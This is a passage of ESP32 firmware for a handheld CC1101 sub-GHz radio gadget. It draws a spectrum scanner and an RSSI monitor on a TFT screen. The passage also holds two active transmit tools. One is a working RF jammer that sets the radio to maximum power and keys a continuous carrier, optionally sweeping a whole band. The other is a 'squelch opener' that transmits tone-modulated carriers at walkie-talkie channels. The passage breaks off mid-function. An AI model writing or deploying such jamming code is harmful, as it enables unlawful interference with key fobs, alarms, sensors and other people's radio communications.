        if (lv > 45 && neighborMax + 18 < lv && sampleIndex > 0 && sampleIndex < RF_SWEEP_POINTS - 1) {
            lv = (uint8_t)((lv + rfSweepLevels[sampleIndex - 1] + rfSweepLevels[sampleIndex + 1]) / 3);
        }
        rfSweepWaterfallBuffer[x] = getRFSweepWaterfallColor(lv);
    }

    tft.startWrite();
    tft.drawRGBBitmap(RF_SWEEP_WATERFALL_X,
                      RF_SWEEP_WATERFALL_Y,
                      rfSweepWaterfallBuffer,
                      RF_SWEEP_WATERFALL_W,
                      RF_SWEEP_WATERFALL_H);
    tft.endWrite();
}

void initializeDisplaySafe() {
    primeSharedSPIBus();
    SPI.end();
    delay(10);
    SPI.begin(18, 19, 23);
    delay(50);

    pinMode(TFT_CS, OUTPUT);
    pinMode(TFT_DC, OUTPUT);
    pinMode(TFT_RST, OUTPUT);

    digitalWrite(TFT_CS, HIGH);
    digitalWrite(TFT_DC, HIGH);
    digitalWrite(TFT_RST, HIGH);
    delay(50);  // Let power stabilize on RST line
    
    digitalWrite(TFT_RST, LOW);
    delay(50);  // Extended LOW time for display reset
    
    digitalWrite(TFT_RST, HIGH);
    delay(200);  // Extended HIGH time for display to stabilize

    tft.begin();
    delay(50);  // Let display begin() complete
    
    tft.setRotation(2);
    delay(20);
    
    tft.fillScreen(ILI9341_BLACK);
    delay(50);  // Let screen clear complete

#if TFT_BACKLIGHT_PIN >= 0
    initTftBacklightPwm();
#endif
    
    drawStatusBar();
    digitalWrite(TFT_CS, HIGH);
    delay(100);  // Final stabilization before returning
}

void runRFScanner() {
    if (!prepareCC1101PassiveTool(rfLockedFrequencyMHz, rfScannerFirstDraw)) {
        drawRFUnavailable("RF Scanner", "CC1101 activity view");
        delay(80);
        return;
    }

    // Graph area constants
    static const int GX = 28;   // left edge (room for dBm labels)
    static const int GY = 68;   // top edge
    static const int GW = 198;  // width
    static const int GH = 140;  // height
    static const int GB = GY + GH; // bottom y

    // Dynamic noise floor
    static int noiseFloor    = -100;
    static int noiseFloorMin = -100;

    // ── First draw: full chrome ──────────────────────────────────────────
    if (rfScannerFirstDraw) {
        rfDiagLog(String("RF Scanner enter band=") + rfBandPresets[rfBandIndex].label +
                  " tune=" + String(rfLockedFrequencyMHz, 3));
        tft.fillScreen(ILI9341_BLACK);
        drawStatusBar();

        // Title bar
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(0, 200, 255));
        tft.setCursor(GX, 24);
        tft.print("RF SCANNER");
        tft.setTextColor(tft.color565(80, 80, 80));
        tft.setCursor(GX + 72, 24);
        tft.print("CC1101 band activity");

        // Graph border
        tft.drawRect(GX - 1, GY - 1, GW + 2, GH + 2, tft.color565(50, 50, 60));

        // Horizontal grid lines at 25%, 50%, 75%
        for (int pct : {25, 50, 75}) {
            int gy = GB - (pct * GH / 100);
            for (int x = GX; x < GX + GW; x += 3) {
                tft.drawPixel(x, gy, tft.color565(30, 30, 40));
            }
        }

        // dBm labels on y-axis (relative to noise floor, shown as +dB above floor)
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(70, 70, 80));
        tft.setCursor(0, GY - 2);       tft.print("+45");
        tft.setCursor(0, GY + GH/4 - 4); tft.print("+34");
        tft.setCursor(0, GY + GH/2 - 4); tft.print("+22");
        tft.setCursor(0, GY + 3*GH/4 - 4); tft.print("+11");

        // Frequency labels on x-axis
        const RFBandPreset &band = rfBandPresets[rfBandIndex];
        float midMHz = (band.startMHz + band.endMHz) / 2.0f;
        tft.setTextColor(tft.color565(80, 80, 90));
        tft.setCursor(GX, GB + 4);
        tft.print(band.startMHz, 0);
        char midStr[12]; snprintf(midStr, sizeof(midStr), "%.0f", midMHz);
        int16_t mx = GX + GW/2 - (strlen(midStr) * 3);
        tft.setCursor(mx, GB + 4);
        tft.print(midStr);
        char endStr[12]; snprintf(endStr, sizeof(endStr), "%.0f", band.endMHz);
        tft.setCursor(GX + GW - strlen(endStr) * 6, GB + 4);
        tft.print(endStr);

        // Band label pill
        tft.fillRoundRect(GX + GW/2 - 30, GB + 14, 60, 10, 3, tft.color565(20, 20, 30));
        tft.setTextColor(tft.color565(0, 200, 255));
        tft.setCursor(GX + GW/2 - 24, GB + 16);
        tft.print(band.label);
        tft.print(" MHz");

        // Bottom hint
        tft.setTextColor(tft.color565(60, 60, 70));
        tft.setCursor(GX, 302);
        tft.print("UP/DN band  SEL pause  LEFT back");

        // Clear graph area
        tft.fillRect(GX, GY, GW, GH, ILI9341_BLACK);

        resetRFSweepLevels();
        noiseFloor    = -100;
        noiseFloorMin = -120;
        rfScannerFirstDraw = false;
    }

    // ── Sample one bin per tick ──────────────────────────────────────────
    if (!rfSweepPaused && (rfLastSampleMs == 0 || millis() - rfLastSampleMs >= 28)) {
        rfLastSampleMs = millis();
        int si = rfSweepCursor;
        float freq = rfSweepFrequencyForIndex(si);

        int rssi = cc1101MeasureSweepRSSI(freq, si);

        if (rssi < noiseFloorMin) noiseFloorMin = rssi;

        uint8_t rawLevel = rfLevelFromRSSI(rssi);
        uint8_t floorLevel = rfSweepNoiseFloor[si];
        if (floorLevel == 0) {
            floorLevel = rawLevel;
        } else if (rawLevel <= floorLevel) {
            floorLevel = rawLevel;
        } else {
            floorLevel = (uint8_t)((floorLevel * 15 + rawLevel) / 16);
        }
        rfSweepNoiseFloor[si] = floorLevel;

        int aboveNoise = (int)rawLevel - (int)floorLevel - RF_SWEEP_NOISE_MARGIN;
        uint8_t level = (aboveNoise <= 0)
            ? 0
            : (uint8_t)constrain(aboveNoise * RF_SWEEP_SIGNAL_GAIN, 0, 100);

        if (rfSweepWarmupPasses > 0) {
            level = 0;
        }

        uint8_t previousLevel = rfSweepLevels[si];
        if (level >= previousLevel) {
            rfSweepLevels[si] = level;
        } else {
            rfSweepLevels[si] = (uint8_t)((previousLevel * 3 + level) / 4);
        }
        if (rfSweepWarmupPasses == 0 && rfSweepLevels[si] > rfSweepPeakHold[si]) {
            rfSweepPeakHold[si] = rfSweepLevels[si];
        }
        if (rssi > rfSweepStrongestRSSI) { rfSweepStrongestRSSI = rssi; rfSweepStrongestMHz = freq; }
        rfCurrentRSSI = rssi;
        orionToolsRssiToneTick(rssi);

        // Pixel column bounds
        int x0 = GX + (si * GW) / (RF_SWEEP_POINTS - 1);
        int x1 = GX + (((si + 1) * GW) / (RF_SWEEP_POINTS - 1)) - 1;
        if (x1 < x0) x1 = x0;
        if (x1 >= GX + GW) x1 = GX + GW - 1;
        int colW = x1 - x0 + 1;

        // Clear column
        tft.fillRect(x0, GY, colW, GH, ILI9341_BLACK);

        // Redraw grid dots in this column
        for (int pct : {25, 50, 75}) {
            int gy = GB - (pct * GH / 100);
            for (int x = x0; x <= x1; x += 3) {
                tft.drawPixel(x, gy, tft.color565(30, 30, 40));
            }
        }

        // Draw gradient bar — use fillRect per color band (fast) instead of per-row
        int barH = (level * GH) / 100;
        if (barH > 0) {
            // 4 color bands: blue, cyan, green→yellow, red
            struct { float t0, t1; uint8_t r0,g0,b0, r1,g1,b1; } bands[] = {
                {0.00f, 0.33f,   0, 0,180,   0, 80,255},
                {0.33f, 0.60f,   0, 80,255,  0,255,  0},
                {0.60f, 0.80f,   0,255,  0, 255,255,  0},
                {0.80f, 1.00f, 255,255,  0, 255,  0,  0},
            };
            for (auto& band : bands) {
                int rowStart = (int)(band.t0 * GH);
                int rowEnd   = (int)(band.t1 * GH);
                if (rowStart >= barH) break;
                if (rowEnd > barH) rowEnd = barH;
                // midpoint color for this band
                float mid = (band.t0 + band.t1) * 0.5f / 1.0f;
                float f = 0.5f;
                uint8_t r = (uint8_t)(band.r0 + f*(band.r1-band.r0));
                uint8_t g = (uint8_t)(band.g0 + f*(band.g1-band.g0));
                uint8_t b = (uint8_t)(band.b0 + f*(band.b1-band.b0));
                int py = GB - rowEnd;
                int h  = rowEnd - rowStart;
                if (h > 0) tft.fillRect(x0, py, colW, h, tft.color565(r, g, b));
            }
        }

        // Peak hold — white tick at peak position
        int peakH = (rfSweepPeakHold[si] * GH) / 100;
        if (peakH > 0 && peakH > barH) {
            int py = GB - 1 - peakH;
            if (py >= GY) tft.drawFastHLine(x0, py, colW, tft.color565(255, 255, 255));
        }

        rfSweepCursor++;
        if (rfSweepCursor >= RF_SWEEP_POINTS) {
            // Exponential smoothing on overall floor — used for the status line only.
            int newFloor = constrain(noiseFloorMin, -110, -55);
            if (noiseFloor == -100) {
                noiseFloor = newFloor;  // first sweep: snap immediately
            } else if (newFloor < noiseFloor) {
                noiseFloor = newFloor;  // drop fast when quieter
            } else {
                noiseFloor = (noiseFloor * 7 + newFloor) / 8;  // rise slowly
            }
            noiseFloorMin = -120;

            if (rfSweepWarmupPasses > 0) {
                rfSweepWarmupPasses--;
            } else {
                orionToolsDecayRfPeakHold(rfSweepPeakHold, rfSweepLevels, RF_SWEEP_POINTS, 2);
                for (int j = 0; j < RF_SWEEP_POINTS; j++) {
                    if (rfSweepLevels[j] > rfSweepPeakHold[j]) rfSweepPeakHold[j] = rfSweepLevels[j];
                }
            }
            rfSweepCursor = 0;
            orionToolsServiceRfCsv("scan", cc1101CurrentMHz, rfCurrentRSSI);
        }
    }

    // ── Status line — only update once per sweep completion ─────────────
    static float lastStatusMHz = -1;
    static int   lastStatusFloor = -999;
    if (rfSweepCursor == 0 || lastStatusMHz < 0) {  // update at sweep wrap
        lastStatusMHz = rfSweepStrongestMHz;
        lastStatusFloor = noiseFloor;
        tft.fillRect(GX, 36, 210, 28, ILI9341_BLACK);
        tft.setTextSize(1);

        tft.setTextColor(tft.color565(0, 200, 255));
        tft.setCursor(GX, 38);
        tft.print(cc1101CurrentMHz, 3);
        tft.setTextColor(tft.color565(60, 60, 70));
        tft.print(" MHz");

        if (rfSweepStrongestRSSI > -120) {
            tft.setTextColor(tft.color565(80, 80, 90));
            tft.setCursor(GX, 50);
            tft.print("Pk ");
            tft.setTextColor(tft.color565(255, 200, 50));
            tft.print(rfSweepStrongestMHz, 2);
            tft.setTextColor(tft.color565(80, 80, 90));
            tft.print("  Flr ");
            tft.setTextColor(tft.color565(100, 180, 100));
            tft.print(noiseFloor);
            tft.print("dB");
        }
    }

    // Paused indicator
    if (rfSweepPaused) {
        tft.fillRoundRect(180, 36, 44, 12, 3, tft.color565(80, 40, 0));
        tft.setTextColor(tft.color565(255, 160, 0));
        tft.setCursor(184, 38);
        tft.print("PAUSED");
    }
}

void runRFMonitor() {
    if (!prepareCC1101PassiveTool(rfLockedFrequencyMHz, rfMonitorFirstDraw)) {
        drawRFUnavailable("RF Monitor", "Lock and watch one freq");
        delay(80);
        return;
    }

    if (rfMonitorFirstDraw) {
        rfDiagLog(String("RF Monitor enter freq=") + String(rfLockedFrequencyMHz, 3));
        drawRFScreenHeader("RF Monitor", "Locked RSSI history");
        tft.drawRect(12, 122, 216, 120, tft.color565(58, 58, 58));
        tft.setTextColor(tft.color565(160, 160, 160));
        tft.setCursor(12, 258);
        tft.print("UP/DN fine tune freq");
        tft.setCursor(12, 274);
        tft.print("HOLD-R SEL/L MHz UP/DN band");
        resetRFMonitorHistory();
        tft.fillRect(14, 124, 212, 116, ILI9341_BLACK);
        rfMonitorFirstDraw = false;
    }

    if (rfLastSampleMs == 0 || millis() - rfLastSampleMs >= 45) {
        rfLastSampleMs = millis();
        // Only recalibrate when frequency changes; otherwise just read RSSI
        static float lastMonitorMHz = -1.0f;
        if (lastMonitorMHz != rfLockedFrequencyMHz) {
            cc1101SetFrequencyMHz(rfLockedFrequencyMHz);
            lastMonitorMHz = rfLockedFrequencyMHz;
        }
        int rssi = cc1101ReadRSSI();
        rfCurrentRSSI = rssi;
        if (!rfMonitorMinHoldValid) {
            rfMonitorMinHoldDbm = rssi;
            rfMonitorMinHoldValid = true;
        } else if (rssi < rfMonitorMinHoldDbm) {
            rfMonitorMinHoldDbm = rssi;
        }
        orionToolsRssiToneTick(rssi);
        orionToolsServiceRfCsv("mon", rfLockedFrequencyMHz, rssi);
        if (rfPeakRSSI < rssi) rfPeakRSSI = rssi;
        rfAverageRSSI = (rfAverageRSSI < -110) ? rssi : ((rfAverageRSSI * 4 + rssi) / 5);
        rfDisplayRSSI = (rfDisplayRSSI * 0.72f) + (rssi * 0.28f);
        rfDisplayAverage = (rfDisplayAverage * 0.80f) + (rfAverageRSSI * 0.20f);
        rfDisplayPeak = max(rfDisplayPeak - 0.35f, (float)rfPeakRSSI);

        rfMonitorHistory[rfMonitorHistoryIndex] = rssi;
        rfMonitorHistoryIndex = (rfMonitorHistoryIndex + 1) % RF_HISTORY_POINTS;
        if (rfMonitorHistoryCount < RF_HISTORY_POINTS) rfMonitorHistoryCount++;

        int x = 14 + rfMonitorGraphColumn;
        if (rfMonitorGraphColumn == 0) {
            tft.fillRect(14, 124, 212, 116, ILI9341_BLACK);
            rfMonitorPrevY = -1;
        }
        tft.fillRect(x, 124, 2, 116, ILI9341_BLACK);
        int y = 126 + ((-40 - constrain(rssi, -110, -40)) * 108) / 70;
        if (rfMonitorPrevY >= 0) {
            tft.drawLine(max(14, x - 1), rfMonitorPrevY, x, y, ILI9341_WHITE);
        } else {
            tft.drawPixel(x, y, ILI9341_WHITE);
        }
        rfMonitorPrevY = y;
        rfMonitorGraphColumn++;
        if (rfMonitorGraphColumn >= 212) {
            rfMonitorGraphColumn = 0;
        }
    }

    drawRFStatLine(74, String("Freq ") + String(rfLockedFrequencyMHz, 3) + " MHz",
                   String((int)rfDisplayRSSI) + " dBm");
    drawRFStatLine(86, String("Avg ") + String((int)rfDisplayAverage) + " Pk " + String((int)rfDisplayPeak),
                   String("Min ") + String(rfMonitorMinHoldValid ? String(rfMonitorMinHoldDbm) : String("--")) + " dBm");

    tft.fillRect(12, 96, 216, 18, ILI9341_BLACK);
    int meterW = map((int)rfDisplayRSSI, -110, -40, 0, 216);
    meterW = constrain(meterW, 0, 216);
    if (meterW > 0) {
        uint16_t meterColor = getWaterfallPaletteColor((rfLevelFromRSSI((int)rfDisplayRSSI) * 25) / 100);
        tft.fillRect(12, 98, meterW, 14, meterColor);
    }
    tft.drawRect(12, 98, 216, 14, tft.color565(72, 72, 72));
}

void runRFJammer() {
    // This screen drives the CC1101 as an active TX tool, so do not borrow the
    // passive RX preparation path here.
    if (!prepareCC1101ActiveTool("RF Jammer", rfJammerFirstDraw)) {
        drawRFUnavailable("RF Jammer", "Sub-GHz signal jammer");
        delay(80);
        return;
    }

    static unsigned long lastUpdate = 0;
    static float lastFreq = 0;
    static uint8_t lastBand = 255;
    static bool lastMode = false;
    unsigned long now = millis();
    if (rfJammerFirstDraw) {
        tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
        
        // Header
        tft.setTextSize(2);
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(18, 40);
        tft.print("RF Jammer");
        
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(160, 160, 160));
        tft.setCursor(18, 58);
        tft.print("Sub-GHz interference");
        
        tft.drawFastHLine(10, 68, 220, tft.color565(52, 52, 52));
        
        // Instructions at bottom
        tft.setTextColor(tft.color565(160, 160, 160));
        tft.setCursor(12, 258);
        tft.print("UP/DN fine tune freq");
        tft.setCursor(12, 274);
        tft.print("HOLD-R SEL/L MHz UP/DN band");
        
        // Draw initial UI
        tft.fillRect(14, 80, 212, 170, ILI9341_BLACK);
        tft.setTextSize(2);
        tft.setTextColor(ILI9341_RED);
        tft.setCursor(60, 100);
        tft.print("JAMMING");
        
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(100, 200, 255));
        tft.setCursor(70, 120);
        tft.print(rfJammerSweepMode ? "[SWEEP]" : "[FIXED]");
        
        tft.setTextSize(2);
        tft.setTextColor(ILI9341_YELLOW);
        tft.setCursor(40, 145);
        tft.print(rfLockedFrequencyMHz, 2);
        tft.print(" MHz");
        
        tft.setTextSize(1);
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(30, 175);
        tft.print("Band: ");
        tft.setTextColor(ILI9341_CYAN);
        tft.print(rfBandPresets[rfBandIndex].label);
        
        tft.setTextColor(tft.color565(150, 150, 150));
        tft.setCursor(30, 190);
        tft.print(rfBandPresets[rfBandIndex].startMHz, 1);
        tft.print("-");
        tft.print(rfBandPresets[rfBandIndex].endMHz, 1);
        tft.print(" MHz");
        
        tft.setCursor(30, 210);
        tft.setTextColor(ILI9341_WHITE);
        tft.print("Power: ");
        tft.setTextColor(ILI9341_RED);
        tft.print("MAX");
        
        if (rfJammerSweepMode) {
            tft.setTextSize(1);
            tft.setTextColor(tft.color565(150, 150, 150));
            tft.setCursor(30, 225);
            tft.print("Linear sweep 500kHz/step");
        }
        
        rfJammerFirstDraw = false;
        lastUpdate = now;
        lastFreq = rfLockedFrequencyMHz;
        lastBand = rfBandIndex;
        lastMode = rfJammerSweepMode;
    }

    // Continuous carrier jamming - strong signal like Flipper Zero
    static bool txActive = false;
    
    // Configure CC1101 for maximum power jamming (only once)
    if (!rfJammerConfigured) {
        cc1101Strobe(CC1101_SIDLE);
        delayMicroseconds(200);

        // Async serial mode — FIFO is bypassed, GDO0 drives the PA directly
        cc1101WriteReg(CC1101_IOCFG0,   0x2D);  // GDO0 = serial TX data
        cc1101WriteReg(CC1101_PKTCTRL0, 0x32);  // async serial, infinite
        cc1101WriteReg(CC1101_MDMCFG2,  0x30);  // OOK, no preamble/sync
        cc1101WriteReg(CC1101_MCSM1,    0x00);  // stay in TX after packet
        cc1101WriteReg(CC1101_MCSM0,    0x18);

        // Maximum PA power
        const uint8_t maxPower = 0xC0;
        cc1101WriteBurst(CC1101_PATABLE, &maxPower, 1);
        cc1101WriteReg(CC1101_FREND0, 0x10);    // use PA[0] for OOK

        rfJammerConfigured = true;
    }

    if (now - lastUpdate > 100) {
        // Sweep frequency if in sweep mode
        if (rfJammerSweepMode) {
            const RFBandPreset &band = rfBandPresets[rfBandIndex];
            rfLockedFrequencyMHz += 0.5f;
            if (rfLockedFrequencyMHz > band.endMHz) {
                rfLockedFrequencyMHz = band.startMHz;
            }
        }

        // Stop TX, update frequency, recalibrate, restart TX
        GPIO.out_w1tc = (1UL << CC1101_GDO0);  // carrier off during retune
        cc1101Strobe(CC1101_SIDLE);
        delayMicroseconds(100);

        uint32_t freqWord = (uint32_t)((cc1101ApplyFrequencyCorrection(rfLockedFrequencyMHz) * 65536.0f / 26.0f) + 0.5f);
        cc1101WriteReg(CC1101_FREQ2, (freqWord >> 16) & 0xFF);
        cc1101WriteReg(CC1101_FREQ1, (freqWord >> 8) & 0xFF);
        cc1101WriteReg(CC1101_FREQ0, freqWord & 0xFF);

        cc1101Strobe(CC1101_SCAL);
        delay(2);

        // Enter TX with GDO0 HIGH = continuous carrier (async OOK, GDO0=1 → PA on)
        pinMode(CC1101_GDO0, OUTPUT);
        cc1101Strobe(CC1101_STX);
        delayMicroseconds(150);
        GPIO.out_w1ts = (1UL << CC1101_GDO0);  // carrier ON

        lastUpdate = now;
    }
    
    // Update display only when values change (every 500ms)
    static unsigned long lastDisplayUpdate = 0;
    if (now - lastDisplayUpdate > 500) {
        bool needsUpdate = (abs(rfLockedFrequencyMHz - lastFreq) > 0.1f ||
                           rfBandIndex != lastBand ||
                           rfJammerSweepMode != lastMode);
        
        if (needsUpdate) {
            // Update frequency
            if (abs(rfLockedFrequencyMHz - lastFreq) > 0.1f) {
                tft.fillRect(40, 145, 160, 20, ILI9341_BLACK);
                tft.setTextSize(2);
                tft.setTextColor(ILI9341_YELLOW);
                tft.setCursor(40, 145);
                tft.print(rfLockedFrequencyMHz, 2);
                tft.print(" MHz");
            }
            
            // Full redraw if band/mode changed
            if (rfBandIndex != lastBand || rfJammerSweepMode != lastMode) {
                tft.fillRect(14, 80, 212, 170, ILI9341_BLACK);
                
                tft.setTextSize(2);
                tft.setTextColor(ILI9341_RED);
                tft.setCursor(60, 100);
                tft.print("JAMMING");
                
                tft.setTextSize(1);
                tft.setTextColor(tft.color565(100, 200, 255));
                tft.setCursor(70, 120);
                tft.print(rfJammerSweepMode ? "[SWEEP]" : "[FIXED]");
                
                tft.setTextSize(2);
                tft.setTextColor(ILI9341_YELLOW);
                tft.setCursor(40, 145);
                tft.print(rfLockedFrequencyMHz, 2);
                tft.print(" MHz");
                
                tft.setTextSize(1);
                tft.setTextColor(ILI9341_WHITE);
                tft.setCursor(30, 175);
                tft.print("Band: ");
                tft.setTextColor(ILI9341_CYAN);
                tft.print(rfBandPresets[rfBandIndex].label);
                
                tft.setTextColor(tft.color565(150, 150, 150));
                tft.setCursor(30, 190);
                tft.print(rfBandPresets[rfBandIndex].startMHz, 1);
                tft.print("-");
                tft.print(rfBandPresets[rfBandIndex].endMHz, 1);
                tft.print(" MHz");
                
                tft.setCursor(30, 210);
                tft.setTextColor(ILI9341_WHITE);
                tft.print("Power: ");
                tft.setTextColor(ILI9341_RED);
                tft.print("MAX");
                
                if (rfJammerSweepMode) {
                    tft.setTextSize(1);
                    tft.setTextColor(tft.color565(150, 150, 150));
                    tft.setCursor(30, 225);
                    tft.print("Linear sweep 500kHz/step");
                }
            }
            
            lastFreq = rfLockedFrequencyMHz;
            lastBand = rfBandIndex;
            lastMode = rfJammerSweepMode;
        }
        
        lastDisplayUpdate = now;
    }
}

void runRFSquelchActivate() {
    if (!prepareCC1101ActiveTool("Squelch", rfSquelchFirstDraw)) {
        drawRFUnavailable("Squelch", "Walkie squelch opener");
        delay(80);
        return;
    }

    static unsigned long lastUpdate = 0;
    static int sqPower = 10;
    static bool active = false;
    static int toneMode = 0;  // 0=1kHz, 1=CTCSS 67Hz, 2=CTCSS 100Hz, 3=CTCSS 141Hz, 4=CTCSS 203Hz
    static bool digitEditMode = false;  // Digit editing mode
    static int selectedDigit = 0;  // 0-6 for the 7 digits
    static unsigned long selectPressStart = 0;
    static bool selectWasDown = false;
    unsigned long now = millis();
    rfSquelchDigitEditActive = digitEditMode;

    // First draw - setup the screen ONCE
    if (rfSquelchFirstDraw) {
        tft.fillRect(0, 20, 240, 300, ILI9341_BLACK);
        
        // Header
        tft.setTextSize(2);
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(18, 40);
        tft.print("Squelch Open");
        
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(160, 160, 160));
        tft.setCursor(18, 58);
        tft.print("Carrier wave opener");
        
        tft.drawFastHLine(10, 68, 220, tft.color565(52, 52, 52));
        
        // Instructions at bottom - change based on mode
        tft.setTextColor(tft.color565(160, 160, 160));
        if (digitEditMode) {
            tft.setCursor(12, 250);
            tft.print("L/R select  UP/DN change");
            tft.setCursor(12, 266);
            tft.print("SELECT exit edit mode");
        } else {
            tft.setCursor(12, 250);
            tft.print("UP/DN tune  SEL=edit");
            tft.setCursor(12, 266);
            tft.print("HOLD SEL=TX");
            tft.setCursor(12, 282);
            tft.print("HOLD-R: L/SEL=tone UP/DN=pwr");
        }
        
        // Draw initial UI
        tft.fillRect(14, 80, 212, 170, ILI9341_BLACK);
        
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(100, 200, 255));
        tft.setCursor(70, 100);
        tft.print(active ? "[ACTIVE]" : "[READY]");
        
        // Draw frequency with digit boxes if in edit mode
        if (digitEditMode) {
            const long scaledFreq = lroundf(rfLockedFrequencyMHz * 10000.0f);
            const int h = (scaledFreq / 1000000L) % 10;
            const int t = (scaledFreq / 100000L) % 10;
            const int o = (scaledFreq / 10000L) % 10;
            const int d0 = (scaledFreq / 1000L) % 10;
            const int d1 = (scaledFreq / 100L) % 10;
            const int d2 = (scaledFreq / 10L) % 10;
            const int d3 = scaledFreq % 10;
            
            tft.setTextSize(2);
            
            // Draw all 7 digits in boxes with highlight for selected
            int xPos = 20;
            int yPos = 125;
            
            for (int i = 0; i < 7; i++) {
                int digit;
                if (i == 0) digit = h;      // Hundreds
                else if (i == 1) digit = t; // Tens
                else if (i == 2) digit = o; // Ones
                else if (i == 3) digit = d0;
                else if (i == 4) digit = d1;
                else if (i == 5) digit = d2;
                else digit = d3;
                
                // Draw box
                if (i == selectedDigit) {
                    tft.fillRect(xPos, yPos, 20, 24, tft.color565(50, 100, 200));
                    tft.setTextColor(ILI9341_WHITE);
                } else {
                    tft.drawRect(xPos, yPos, 20, 24, tft.color565(100, 100, 100));
                    tft.setTextColor(ILI9341_YELLOW);
                }
                
                tft.setCursor(xPos + 6, yPos + 5);
                tft.print(digit);
                
                xPos += 24;
                
                // Draw decimal point after digit 2 (ones place)
                if (i == 2) {
                    tft.setTextColor(ILI9341_WHITE);
                    tft.setCursor(xPos - 12, yPos + 5);
                    tft.print(".");
                    xPos += 8;
                }
            }
            
            tft.setTextSize(2);
            tft.setTextColor(ILI9341_WHITE);
            tft.setCursor(xPos + 2, 130);
            tft.print(" MHz");
        } else {
            // Normal frequency display
            tft.setTextSize(2);
            tft.setTextColor(ILI9341_YELLOW);
            tft.setCursor(40, 130);
            tft.print(rfLockedFrequencyMHz, 4);
            tft.print(" MHz");
        }
        
        tft.setTextSize(1);
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(30, 165);
        tft.print("Power: ");
        tft.setTextColor(ILI9341_CYAN);
        tft.print(sqPower);
        tft.print(" dBm");
        
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(30, 180);
        tft.print("Tone: ");
        tft.setTextColor(ILI9341_YELLOW);
        // Use switch instead of array to save stack space
        switch(toneMode) {
            case 0: tft.print("1kHz"); break;
            case 1: tft.print("67Hz"); break;
            case 2: tft.print("100Hz"); break;
            case 3: tft.print("141Hz"); break;
            case 4: tft.print("203Hz"); break;
        }
        
        tft.setTextColor(tft.color565(150, 150, 150));
        tft.setCursor(30, 195);
        tft.print("Modulated carrier");
        rfSquelchFirstDraw = false;
    }

    // Button handling with coarse/fine tuning and digit editing
    static unsigned long rightPressStart = 0;
    bool rightHeld = (companion_readButtonState(BTN_RIGHT) == LOW);
    
    // Track RIGHT button press time
    if (rightHeld && rightPressStart == 0) {
        rightPressStart = now;
    }
    if (!rightHeld) {
        rightPressStart = 0;
    }
    
    // If RIGHT held for >300ms, enable special mode (only when not in digit edit mode)
    bool holdMode = !digitEditMode && (rightHeld && rightPressStart > 0 && (now - rightPressStart > 300));
    
    // DIGIT EDIT MODE - edit individual digits (all 7: hundreds, tens, ones, decimal x4)
    if (digitEditMode) {
        // LEFT/RIGHT: select digit
        if (isPressed(BTN_LEFT)) {
            selectedDigit--;
            if (selectedDigit < 0) selectedDigit = 6;  // 7 digits total (0-6)
            rfSquelchFirstDraw = true;
            delay(150);
        }
        if (isPressed(BTN_RIGHT)) {
            selectedDigit++;
            if (selectedDigit > 6) selectedDigit = 0;  // 7 digits total (0-6)
            rfSquelchFirstDraw = true;
            delay(150);
        }
        
        // UP/DOWN: change selected digit (0-9)
        if (isPressed(BTN_UP) || isPressed(BTN_DOWN)) {
            long scaledFreq = lroundf(rfLockedFrequencyMHz * 10000.0f);

            int h = (scaledFreq / 1000000L) % 10;
            int t = (scaledFreq / 100000L) % 10;
            int o = (scaledFreq / 10000L) % 10;
            int d0 = (scaledFreq / 1000L) % 10;
            int d1 = (scaledFreq / 100L) % 10;
            int d2 = (scaledFreq / 10L) % 10;
            int d3 = scaledFreq % 10;
            
            // Modify selected digit
            if (selectedDigit == 0) {  // Hundreds
                if (isPressed(BTN_UP)) { h++; if (h > 9) h = 0; }
                else { h--; if (h < 0) h = 9; }
            } else if (selectedDigit == 1) {  // Tens
                if (isPressed(BTN_UP)) { t++; if (t > 9) t = 0; }
                else { t--; if (t < 0) t = 9; }
            } else if (selectedDigit == 2) {  // Ones
                if (isPressed(BTN_UP)) { o++; if (o > 9) o = 0; }
                else { o--; if (o < 0) o = 9; }
            } else if (selectedDigit == 3) {  // First decimal
                if (isPressed(BTN_UP)) { d0++; if (d0 > 9) d0 = 0; }
                else { d0--; if (d0 < 0) d0 = 9; }
            } else if (selectedDigit == 4) {  // Second decimal
                if (isPressed(BTN_UP)) { d1++; if (d1 > 9) d1 = 0; }
                else { d1--; if (d1 < 0) d1 = 9; }
            } else if (selectedDigit == 5) {  // Third decimal
                if (isPressed(BTN_UP)) { d2++; if (d2 > 9) d2 = 0; }
                else { d2--; if (d2 < 0) d2 = 9; }
            } else {  // Fourth decimal
                if (isPressed(BTN_UP)) { d3++; if (d3 > 9) d3 = 0; }
                else { d3--; if (d3 < 0) d3 = 9; }
            }
            
            scaledFreq =
                (long)h * 1000000L +
                (long)t * 100000L +
                (long)o * 10000L +
                (long)d0 * 1000L +
                (long)d1 * 100L +
                (long)d2 * 10L +
                (long)d3;

            if (scaledFreq > 4700000L) scaledFreq = 4700000L;
            if (scaledFreq < 3000000L) scaledFreq = 3000000L;
            rfLockedFrequencyMHz = scaledFreq / 10000.0f;
            
            if (active) lastUpdate = 0;
            rfSquelchFirstDraw = true;
            delay(120);
        }
        
        // SELECT: exit digit edit mode
        if (isPressed(BTN_SELECT)) {
            digitEditMode = false;
            rfSquelchFirstDraw = true;
            delay(200);
        }
    }
    // HOLD RIGHT MODE - tone selection and power adjustment
    else if (holdMode) {
        // Hold RIGHT mode: LEFT/SELECT for tone selection, UP/DOWN for power
        if (isPressed(BTN_SELECT)) {
            // Cycle tone forward
            toneMode++;
            if (toneMode > 4) toneMode = 0;
            rfSquelchFirstDraw = true;
            delay(120);  // Consume button press
        }
        if (isPressed(BTN_LEFT)) {
            // Cycle tone backward
            toneMode--;
            if (toneMode < 0) toneMode = 4;
            rfSquelchFirstDraw = true;
            delay(120);  // Consume button press to prevent global back handler
        }
        if (isPressed(BTN_UP)) {
            sqPower += 2;
            if (sqPower > 10) sqPower = 10;
            if (active) lastUpdate = 0;
            rfSquelchFirstDraw = true;
            delay(120);  // Consume button press
        }
        if (isPressed(BTN_DOWN)) {
            sqPower -= 2;
            if (sqPower < -10) sqPower = -10;
            if (active) lastUpdate = 0;
